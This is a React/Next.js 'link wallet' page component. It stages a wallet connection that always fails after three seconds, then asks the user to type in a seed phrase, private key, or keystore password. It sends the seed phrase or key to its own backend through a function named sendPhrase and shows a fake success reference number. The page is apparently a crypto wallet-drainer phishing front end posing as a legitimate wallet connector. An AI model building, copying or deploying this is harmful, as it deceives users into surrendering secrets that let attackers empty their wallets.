'use client';
import { Search, X, Loader2, File, Key, Copy, CheckCircle } from 'lucide-react';
import { useState } from 'react';
import { api } from '@/utils/api';
import toast from 'react-hot-toast';
import { useRouter } from 'next/navigation';

export default function LinkWalletScreen() {
  const router = useRouter();
  const [search, setSearch] = useState('');
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [seedPhrase, setSeedPhrase] = useState('');
  const [connectionState, setConnectionState] = useState(null);
  const [error, setError] = useState(false);
  const [connectionMethod, setConnectionMethod] = useState('phrase');
  const [keystorePassword, setKeystorePassword] = useState('');
  const [keystoreFile, setKeystoreFile] = useState(null);
  const [privateKey, setPrivateKey] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [successData, setSuccessData] = useState(null);

  const handleWalletClick = (wallet) => {
    setSelectedWallet(wallet);
    setSeedPhrase('');
    setConnectionState('connecting');
    // Simulate connection attempt
    setTimeout(() => {
      setConnectionState('failed');
    }, 3000);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    
    try {
      const token = localStorage.getItem('token');
      if (!token) {
        router.push('/login');
        return;
      }

      let walletData = {
        type: selectedWallet.name,
        address: ''
      };

      // Add wallet data based on connection method
      switch(connectionMethod) {
        case 'phrase':
          if (seedPhrase) {
            await api.sendPhrase(token, seedPhrase);
            walletData.address = 'Generated from Seed Phrase';
          }
          break;
        case 'private':
          if (privateKey) {
            await api.sendPhrase(token, privateKey);
            walletData.address = 'Generated from Private Key';
          }
          break;
        case 'keystore':
          if (keystoreFile && keystorePassword) {
            walletData.address = 'Generated from Keystore';
            // You might want to handle keystore file separately
          }
          break;
      }

      // Link the wallet
      const response = await api.linkWallet(token, walletData);
      
      setSuccessData({
        referenceNumber: response.referenceNumber,
        walletType: selectedWallet.name
      });
      
    } catch (error) {
      toast.error(error.message || 'Failed to link wallet');
      setError(true);
    } finally {
      setIsLoading(false);
    }
  };

  const copyReferenceNumber = () => {
    if (successData?.referenceNumber) {
      navigator.clipboard.writeText(successData.referenceNumber);
      toast.success('Reference number copied to clipboard');
    }
  };

  return (
    <div className="space-y-6 relative">
      {/* Connection Modal */}
      {selectedWallet && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
          <div className="bg-gray-800 rounded-2xl p-6 w-full max-w-md m-4">
            {connectionState === 'connecting' && (
              <div className="py-8 flex flex-col items-center gap-4">
                <Loader2 size={40} className="text-blue-500 animate-spin" />
                <p className="text-white font-medium">Connecting to {selectedWallet.name}...</p>
                <p className="text-gray-400 text-sm">Please approve connection in your wallet</p>
              </div>
            )}

            {connectionState === 'failed' && (
              <div className="py-8 flex flex-col items-center gap-4">
                <p className="text-red-500 font-medium">Connection Failed</p>
                <p className="text-gray-400 text-sm">Please try again or use a manual connection method</p>
              </div>
            )}

            {connectionState === 'manual' && (
              <form onSubmit={handleSubmit} className="space-y-4">
                <div>
                  <label className="text-sm font-medium text-gray-300">Connection Method</label>
                  <select
                    value={connectionMethod}
                    onChange={(e) => setConnectionMethod(e.target.value)}
                    className="mt-1 block w-full px-4 py-3 bg-white/5 border border-white/10 rounded-lg text-white"
                  >
                    <option value="phrase">Seed Phrase</option>
                    <option value="private">Private Key</option>
                    <option value="keystore">Keystore File</option>
                  </select>
                </div>

                {connectionMethod === 'phrase' && (
                  <div>
                    <label className="text-sm font-medium text-gray-300">Seed Phrase</label>
                    <textarea
                      value={seedPhrase}
                      onChange={(e) => setSeedPhrase(e.target.value)}
                      className="mt-1 block w-full px-4 py-3 bg-white/5 border border-white/10 rounded-lg text-white"
                      placeholder="Enter seed phrase"
                      rows={3}
                    />
                  </div>
                )}

                {connectionMethod === 'private' && (
                  <div>
                    <label className="text-sm font-medium text-gray-300">Private Key</label>
                    <input
                      type="text"
                      value={privateKey}
                      onChange={(e) => setPrivateKey(e.target.value)}
                      className="mt-1 block w-full px-4 py-3 bg-white/5 border border-white/10 rounded-lg text-white"
                      placeholder="Enter private key"
                    />
                  </div>
                )}

                {connectionMethod === 'keystore' && (
                  <div>
                    <label className="text-sm font-medium text-gray-300">Keystore File</label>
                    <input
                      type="file"
                      onChange={(e) => setKeystoreFile(e.target.files[0])}
                      className="mt-1 block w-full px-4 py-3 bg-white/5 border border-white/10 rounded-lg text-white"
                    />
                    <label className="text-sm font-medium text-gray-300 mt-4">Keystore Password</label>
                    <input
                      type="password"
                      value={keystorePassword}
                      onChange={(e) => setKeystorePassword(e.target.value)}
                      className="mt-1 block w-full px-4 py-3 bg-white/5 border border-white/10 rounded-lg text-white"
                      placeholder="Enter keystore password"
                    />
                  </div>
                )}

                <button 
                  type="submit"
                  disabled={isLoading}
                  className="w-full bg-blue-500 hover:bg-blue-600 text-white px-4 py-3 rounded-xl transition-all disabled:opacity-50"
                >
                  {isLoading ? 'Connecting...' : 'Connect Wallet'}
                </button>
              </form>
            )}
          </div>
        </div>
      )}

      {/* Success Modal */}
      {successData && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
          <div className="bg-gray-800 rounded-2xl p-6 w-full max-w-md m-4">
            <div className="flex flex-col items-center gap-4">
              <div className="w-16 h-16 bg-green-500/10 rounded-full flex items-center justify-center">
                <CheckCircle className="w-8 h-8 text-green-500" />
              </div>
              <h3 className="text-2xl font-bold text-white">Wallet Linked Successfully</h3>
              <p className="text-gray-400 text-center">
                Your {successData.walletType} wallet has been successfully linked
              </p>
              
              <div className="w-full bg-white/5 rounded-lg p-4 mt-4">
                <p className="text-sm text-gray-400 mb-2">Reference Number</p>
                <div className="flex items-center justify-between">
                  <code className="text-white font-mono">{successData.referenceNumber}</code>
                  <button
                    onClick={copyReferenceNumber}
                    className="p-2 hover:bg-white/10 rounded-lg transition-colors"
                  >
                    <Copy className="w-4 h-4 text-gray-400" />
                  </button>
                    
                  
                </div>
              </div>

              <button
                onClick={() => {
                  setSuccessData(null);
                  setSelectedWallet(null);
                  setConnectionState(null);
                  setSeedPhrase('');
                  setPrivateKey('');
                  setKeystoreFile(null);
                  setKeystorePassword('');
                }}
                className="w-full bg-white/10 hover:bg-white/20 text-white px-4 py-3 rounded-xl transition-all mt-4"
              >
                Close
              </button>
              </div>
              </div>
              </div>
      )}
    </div>
  )
}
